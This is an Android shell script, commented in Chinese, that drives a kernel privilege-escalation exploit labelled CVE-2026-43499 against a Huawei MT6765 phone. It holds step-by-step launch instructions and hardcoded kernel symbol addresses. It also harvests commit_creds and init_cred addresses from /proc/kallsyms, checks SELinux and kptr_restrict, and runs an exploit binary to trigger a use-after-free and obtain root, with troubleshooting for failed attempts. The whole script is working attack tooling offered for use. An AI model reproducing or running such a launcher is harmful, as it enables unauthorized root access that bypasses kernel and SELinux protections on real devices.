#!/system/bin/sh
# ============================================================
# CVE-2026-43499 ARM32 Exploit - MT管理器直接运行版
# 内核 2: BOOT.img (华为畅享10e, ARM64 aarch64 内核)
# 目标: Huawei Changxiang 20e (MLD-AL10, MT6765)
#
# 使用方法:
#   1. 将 exploit 和 run_boot10e.sh 复制到手机任意目录
#      (推荐: /sdcard/Download/cve_2026_43499/)
#   2. 用MT管理器打开该目录
#   3. 点击 run_boot10e.sh → 选择"打开方式" → "终端" 或 "执行"
#   4. 或者打开MT管理器终端, 输入:
#      cd /sdcard/Download/cve_2026_43499
#      sh run_boot10e.sh
#
# 参数:
#   sh run_boot10e.sh            # 完整exploit (自动提取符号)
#   sh run_boot10e.sh -t         # 测试模式 (仅触发UAF, 不提权)
#   sh run_boot10e.sh -d         # 尝试debug spinlock布局
#   sh run_boot10e.sh 0xADDR ... # 手动指定符号地址
#
# 本脚本针对 BOOT.img (华为畅享10e ARM64内核):
#   - 内核地址范围 0xFFFFFF8000000000+ (ARM64)
#   - 已知符号 (从 vmlinux_stock.elf 提取):
#       commit_creds        = 0xffffff80080dd76c
#       prepare_kernel_cred = 0xffffff80080ddb14
#       kallsyms_lookup_name = 0xffffff80081755f4
#   - 注意: exploit 为 ARM32 编译, unsigned long=4字节
#            64位地址会被截断为低32位
#            建议优先使用 /proc/kallsyms 实时读取
# ============================================================

# ── 获取脚本所在目录 ──
SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
if [ -z "$SCRIPT_DIR" ]; then
    SCRIPT_DIR="$PWD"
fi

# 如果还是空的, 用 $0 推导
if [ -z "$SCRIPT_DIR" ] || [ "$SCRIPT_DIR" = "/" ]; then
    case "$0" in
        /*) SCRIPT_DIR="$(dirname "$0")" ;;
        *) SCRIPT_DIR="$PWD" ;;
    esac
fi

EXPLOIT="$SCRIPT_DIR/exploit"
LOG_FILE="$SCRIPT_DIR/cve_2026_43499_boot10e.log"

# ── 兼容 MT管理器的 echo ──
print_msg() {
    printf '%s\n' "$1"
}

print_msg ""
print_msg "============================================"
print_msg " CVE-2026-43499 ARM32 Exploit"
print_msg " 内核 2: BOOT.img (华为畅享10e ARM64)"
print_msg " Target: MT6765 (Huawei Changxiang 20e)"
print_msg "============================================"
print_msg ""

# ── 检查是否已经是 root ──
if [ "$(id -u)" = "0" ] 2>/dev/null; then
    print_msg "[+] 已经是 root!"
    exit 0
fi

# ── 检查架构 ──
ARCH=$(uname -m 2>/dev/null)
print_msg "[*] 架构: $ARCH"
case "$ARCH" in
    aarch64|arm64)
        print_msg "[+] ARM64 内核确认 - 与 BOOT.img 匹配"
        print_msg "[!] exploit 为 ARM32 编译, 64位地址会被截断"
        print_msg "[!] 优先依赖 /proc/kallsyms 实时读取"
        ;;
    armv7l|armv8l)
        print_msg "[!] 当前内核是 ARM32"
        print_msg "[!] BOOT.img 是 ARM64 内核, 不匹配"
        print_msg "[!] 如需使用 boot.img (ARM32 zImage), 请用 run_boot.sh"
        print_msg "[!] 继续尝试..."
        ;;
    *)
        print_msg "[!] 警告: 未知架构 $ARCH"
        ;;
esac

# ── 检查内核版本 ──
KVER=$(uname -r 2>/dev/null)
print_msg "[*] 内核: $KVER"

KMAJOR=$(echo "$KVER" | cut -d. -f1)
KMINOR=$(echo "$KVER" | cut -d. -f2)
print_msg "[*] 内核版本: $KMAJOR.$KMINOR"

# 检查是否在受影响范围内 (2.6.39 ~ 7.1)
VULN=0
if [ "$KMAJOR" -gt 2 ] 2>/dev/null; then
    if [ "$KMAJOR" -lt 7 ] 2>/dev/null; then
        VULN=1
    elif [ "$KMAJOR" = "7" ] 2>/dev/null && [ "$KMINOR" -le 1 ] 2>/dev/null; then
        VULN=1
    fi
elif [ "$KMAJOR" = "2" ] 2>/dev/null && [ "$KMINOR" -ge 39 ] 2>/dev/null; then
    VULN=1
fi

if [ "$VULN" = "1" ]; then
    print_msg "[+] 内核版本在受影响范围内 (2.6.39 ~ 7.1)"
else
    print_msg "[!] 内核版本可能不受影响"
    print_msg "[!] 继续尝试..."
fi

# ── 检查 CPU 信息 ──
CPU_CORES=0
if [ -f /proc/cpuinfo ]; then
    CPU_CORES=$(grep -c ^processor /proc/cpuinfo 2>/dev/null)
    print_msg "[*] CPU 核心数: $CPU_CORES"
    if [ "$CPU_CORES" -lt 2 ] 2>/dev/null; then
        print_msg "[!] 警告: 需要至少 2 个核心"
    fi
fi

# ── 检查 exploit 二进制 ──
if [ ! -f "$EXPLOIT" ]; then
    print_msg "[-] 找不到 exploit 二进制: $EXPLOIT"
    print_msg "[-] 请确保 exploit 文件与此脚本在同一目录"
    print_msg "[-] 当前目录: $SCRIPT_DIR"
    print_msg "[-] 目录内容:"
    ls -la "$SCRIPT_DIR" 2>/dev/null
    exit 1
fi

# 设置可执行权限
chmod 755 "$EXPLOIT" 2>/dev/null
if [ ! -x "$EXPLOIT" ]; then
    print_msg "[!] 无法设置执行权限, 尝试复制到 /data/local/tmp"
    cp "$EXPLOIT" /data/local/tmp/exploit 2>/dev/null
    if [ -f /data/local/tmp/exploit ]; then
        chmod 755 /data/local/tmp/exploit 2>/dev/null
        EXPLOIT="/data/local/tmp/exploit"
        SCRIPT_DIR="/data/local/tmp"
        print_msg "[+] 已复制到 /data/local/tmp"
    else
        print_msg "[-] 无法复制到 /data/local/tmp"
        print_msg "[-] 请尝试手动操作:"
        print_msg "[-]   cp exploit /data/local/tmp/"
        print_msg "[-]   chmod 755 /data/local/tmp/exploit"
        print_msg "[-]   cd /data/local/tmp && sh run_boot10e.sh"
        exit 1
    fi
fi

# ── 检查 /dev/null 可访问性 ──
if [ ! -c /dev/null ]; then
    print_msg "[!] /dev/null 不可用, exploit 触发阶段可能失败"
fi

# ── 尝试读取 /proc/kallsyms ──
print_msg ""
print_msg "[*] 检查 /proc/kallsyms..."

SYMS_AVAILABLE=0
COMMIT_CREDS=""
INIT_CRED=""
NULL_FOPS=""
INIT_TASK=""

if [ -r /proc/kallsyms ]; then
    CC=$(grep -m1 -w "commit_creds" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    IC=$(grep -m1 -w "init_cred" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    NF=$(grep -m1 -w "null_fops" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    IT=$(grep -m1 -w "init_task" /proc/kallsyms 2>/dev/null | awk '{print $1}')

    # 检查地址是否非零 (kptr_restrict=0)
    if [ -n "$CC" ] && [ "$CC" != "0000000000000000" ] && [ "$CC" != "00000000" ] && [ "$CC" != "0" ]; then
        # 检查地址长度
        CC_LEN=${#CC}
        if [ "$CC_LEN" -gt 8 ]; then
            print_msg "[+] kallsyms 可用 (ARM64 地址, kptr_restrict=0)"
            print_msg "[+]   commit_creds (64bit) = 0x$CC"
            print_msg "[!]   注意: exploit ARM32 会截断为低32位"
            # 截取低32位 (最后8位 hex)
            CC_LOW=$(echo "$CC" | tail -c 9)
            IC_LOW=$(echo "$IC" | tail -c 9)
            NF_LOW=$(echo "$NF" | tail -c 9)
            IT_LOW=$(echo "$IT" | tail -c 9)
            print_msg "[*]   截断后 (ARM32): commit_creds = 0x$CC_LOW"
            print_msg "[*]   截断后 (ARM32): init_cred    = 0x$IC_LOW"
            print_msg "[!]   警告: 截断地址可能不正确, 建议手动提供"
            print_msg "[!]   警告: ARM32 exploit 在 ARM64 内核上成功率较低"
            print_msg "[!]   建议: 如果设备支持, 刷入 boot.img (ARM32 zImage)"
            COMMIT_CREDS="0x$CC_LOW"
            INIT_CRED="0x$IC_LOW"
            NULL_FOPS="0x$NF_LOW"
            INIT_TASK="0x$IT_LOW"
            SYMS_AVAILABLE=1
        else
            # ARM32 地址 (8位)
            COMMIT_CREDS="0x$CC"
            INIT_CRED="0x$IC"
            NULL_FOPS="0x$NF"
            INIT_TASK="0x$IT"
            SYMS_AVAILABLE=1
            print_msg "[+] kallsyms 可用 (ARM32 地址, kptr_restrict=0)"
            print_msg "[+]   commit_creds = $COMMIT_CREDS"
            print_msg "[+]   init_cred    = $INIT_CRED"
            if [ -n "$NULL_FOPS" ] && [ "$NULL_FOPS" != "0x00000000" ] && [ "$NULL_FOPS" != "0x" ]; then
                print_msg "[+]   null_fops    = $NULL_FOPS"
            else
                print_msg "[+]   null_fops    = (未找到, exploit将自动查找)"
                NULL_FOPS=""
            fi
            if [ -n "$INIT_TASK" ] && [ "$INIT_TASK" != "0x00000000" ] && [ "$INIT_TASK" != "0x" ]; then
                print_msg "[+]   init_task    = $INIT_TASK"
            else
                print_msg "[+]   init_task    = (未找到)"
                INIT_TASK=""
            fi
        fi
    else
        print_msg "[!] kallsyms 地址被屏蔽 (kptr_restrict > 0)"
        print_msg "[!] 需要手动提供地址"
        print_msg "[!] 已知符号 (从 BOOT.img 提取, 64位):"
        print_msg "[!]   commit_creds = 0xffffff80080dd76c"
        print_msg "[!]   prepare_kernel_cred = 0xffffff80080ddb14"
        print_msg "[!]   kallsyms_lookup_name = 0xffffff80081755f4"
        print_msg "[!] 截断后 (ARM32):"
        print_msg "[!]   commit_creds = 0x080dd76c"
        print_msg "[!] 注意: 截断地址可能不正确"
    fi
else
    print_msg "[!] /proc/kallsyms 不可读"
    print_msg "[!] 需要手动提供地址"
fi

# ── 检查 kptr_restrict ──
if [ -f /proc/sys/kernel/kptr_restrict ]; then
    KPTR=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
    print_msg "[*] kptr_restrict = $KPTR"
fi

# ── 检查 SELinux ──
if [ -f /sys/fs/selinux/enforce ]; then
    SELINUX=$(cat /sys/fs/selinux/enforce 2>/dev/null)
    if [ "$SELINUX" = "1" ]; then
        print_msg "[*] SELinux: Enforcing"
        print_msg "[!] SELinux 强制模式, exploit 可能被阻止"
    else
        print_msg "[*] SELinux: Permissive"
    fi
elif [ -f /proc/self/attr/current ]; then
    SECONTEXT=$(cat /proc/self/attr/current 2>/dev/null)
    print_msg "[*] SELinux context: $SECONTEXT"
fi

# ── 构建命令行参数 ──
ARGS=""

# 透传用户参数
USER_ARGS=""
while [ $# -gt 0 ]; do
    case "$1" in
        -t|-d|-h)
            USER_ARGS="$USER_ARGS $1"
            shift
            ;;
        0x*|0X*)
            USER_ARGS="$USER_ARGS $1"
            shift
            ;;
        *)
            shift
            ;;
    esac
done

# 如果 kallsyms 可用且用户没有手动提供地址, 自动传入
if [ "$SYMS_AVAILABLE" = "1" ]; then
    case "$USER_ARGS" in
        *0x*|*0X*)
            ARGS="$USER_ARGS"
            ;;
        *)
            ARGS="$USER_ARGS $COMMIT_CREDS $INIT_CRED"
            if [ -n "$NULL_FOPS" ] && [ "$NULL_FOPS" != "0x" ]; then
                ARGS="$ARGS $NULL_FOPS"
            fi
            if [ -n "$INIT_TASK" ] && [ "$INIT_TASK" != "0x" ]; then
                ARGS="$ARGS $INIT_TASK"
            fi
            ;;
    esac
else
    ARGS="$USER_ARGS"
fi

# ── 运行 exploit ──
print_msg ""
print_msg "============================================"
print_msg "[*] 开始运行 exploit (BOOT.img 华为畅享10e 内核模式)..."
print_msg "[*] 命令: $EXPLOIT $ARGS"
print_msg "============================================"
print_msg ""

# 运行并保存日志
"$EXPLOIT" $ARGS 2>&1 | tee "$LOG_FILE"
EXIT_CODE=$?

print_msg ""
print_msg "============================================"
if [ $EXIT_CODE -eq 0 ]; then
    print_msg "[+] EXPLOIT 成功!"
    print_msg "[+] 日志已保存: $LOG_FILE"
else
    print_msg "[-] Exploit 失败 (退出码: $EXIT_CODE)"
    print_msg "[-] 日志已保存: $LOG_FILE"
    print_msg ""
    print_msg "故障排除 (BOOT.img ARM64 内核):"
    print_msg "  1. 先运行 'sh run_boot10e.sh -t' 确认 UAF 是否触发"
    print_msg "  2. 如果测试模式崩溃重启, 说明漏洞存在"
    print_msg "  3. ARM32 exploit 在 ARM64 内核上成功率较低:"
    print_msg "     - 内核指针 8字节, exploit 只能处理 4字节"
    print_msg "     - pselect 盖写偏移可能与 ARM64 内核栈不匹配"
    print_msg "  4. 如果可能, 刷入 boot.img (ARM32 zImage) 后用 run_boot.sh"
    print_msg "  5. 尝试 'sh run_boot10e.sh -d' 使用 debug 布局"
    print_msg "  6. 手动提供地址 (从 BOOT.img 提取的 64位地址):"
    print_msg "     sh run_boot10e.sh 0xffffff80080dd76c 0x<init_cred> 0x<null_fops> 0x<init_task>"
    print_msg "     注意: exploit 会截断为低32位, 可能不正确"
    print_msg "  7. 检查 SELinux 是否阻止 (setenforce 0 需要 root)"
    print_msg ""
    print_msg "日志内容:"
    head -50 "$LOG_FILE" 2>/dev/null
fi
print_msg "============================================"

exit $EXIT_CODE
